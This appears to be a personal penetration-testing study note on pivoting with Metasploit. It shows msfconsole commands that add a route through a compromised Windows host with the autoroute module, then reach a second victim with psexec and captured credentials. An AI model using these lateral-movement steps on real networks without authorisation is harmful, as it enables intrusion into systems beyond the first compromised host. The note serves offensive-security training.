# e - Pivoting

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# View the Metapreter Routing Table.
msf> route print # at 1st it is empty.

# ------------------------------------ Scenerio 1
# assuming we successfully exploited victim 1, and want to be able to exploit victim 2 through victim 1, we must add victim 2 ip subnet to Meterpreter 1st. We will gain access to victim 2 using the "psexec" module because we have creds.
# add routes using the autoroute module
msf> use post/windows/manage/autoroute
msf> options
msf> set SESSION <session_number>
msf> set SUBNET $ip_subnet
msf> run
msf> route print # we should see the added route now.
# now we can directly exploit victim 2 from our Kali machine.

# ------------------------------------ Scenerio 2
# But what if we want to exploit victim 2 through victim 1 and not through our kali? we can go back to the "auto route" module and add the victim 1 subnet to the routing table, then in "psexec" module, we can change the LHOST option to victim 1 IP address, then run. Use wireshark to verify the traffice flows from victim 1 to victim 2.
```
{% endcode %}

